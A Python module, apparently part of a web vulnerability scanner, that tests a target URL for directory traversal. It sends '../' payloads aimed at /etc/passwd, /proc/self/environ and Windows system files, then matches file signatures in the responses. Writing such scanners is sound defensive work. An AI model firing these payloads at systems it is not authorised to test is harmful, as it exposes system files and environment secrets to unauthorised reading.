import aiohttp
import logging
from .utils import inject_payload

logger = logging.getLogger(__name__)

async def check_directory_traversal(target_url):
    vulnerabilities = []
    logger.info("Checking for Directory Traversal vulnerabilities")

    # Payloads for directory traversal attempts for both Linux and Windows systems
    traversal_payloads = [
        "../" * i + path for i in range(1, 7) for path in ["etc/passwd", "proc/self/environ", "windows/win.ini", "windows/system32/drivers/etc/hosts"]
    ]

    # File signatures to verify access based on expected content in the files
    file_signatures = {
        "etc/passwd": "root:x:0:0:",
        "proc/self/environ": "PATH=",
        "windows/win.ini": "[fonts]",
        "windows/system32/drivers/etc/hosts": "localhost"
    }

    async with aiohttp.ClientSession() as session:
        for payload in traversal_payloads:
            test_url = inject_payload(target_url, payload)
            try:
                logger.info(f"Testing payload: {payload}")
                async with session.get(test_url, timeout=10, ssl=False) as response:
                    if response.status != 200:
                        continue
                        
                    response_text = (await response.text()).lower()

                    # Check response for known file signatures
                    for file_path, signature in file_signatures.items():
                        if signature.lower() in response_text:
                            vulnerabilities.append({
                                "type": "Directory Traversal",
                                "description": f"Accessed sensitive system file using payload: {payload}",
                                "location": test_url,
                                "severity": "High"
                            })
                            logger.warning(f"Directory Traversal vulnerability detected with payload: {payload} on file: {file_path}")
                            return vulnerabilities  # Stop after detection
            except Exception as e:
                logger.error(f"Error during Directory Traversal check with payload '{payload}': {e}")

    logger.info("Directory Traversal check completed with no vulnerabilities found.")
    return vulnerabilities


async def scan(target_url):
    """
    Main scan function that wraps the check_directory_traversal functionality.
    """
    return await check_directory_traversal(target_url)
